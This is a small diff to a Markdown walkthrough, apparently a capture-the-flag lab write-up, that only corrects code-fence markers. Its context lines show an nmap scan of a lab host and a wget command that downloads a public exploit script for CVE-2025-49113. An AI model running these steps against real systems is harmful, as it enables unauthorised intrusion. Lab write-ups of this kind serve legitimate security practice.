@@ -26,7 +26,7 @@ I started with an Nmap scan:
 
 nmap -sV 10.10.11.77
 
-````
+```
 
 Only two ports were open:
 
@@ -51,7 +51,7 @@ I used the public exploit for CVE-2025-49113:
 
 ```bash
 wget https://raw.githubusercontent.com/fearsoff-org/CVE-2025-49113/refs/heads/main/CVE-2025-49113.php
-````
+```
 
 Then ran:
 
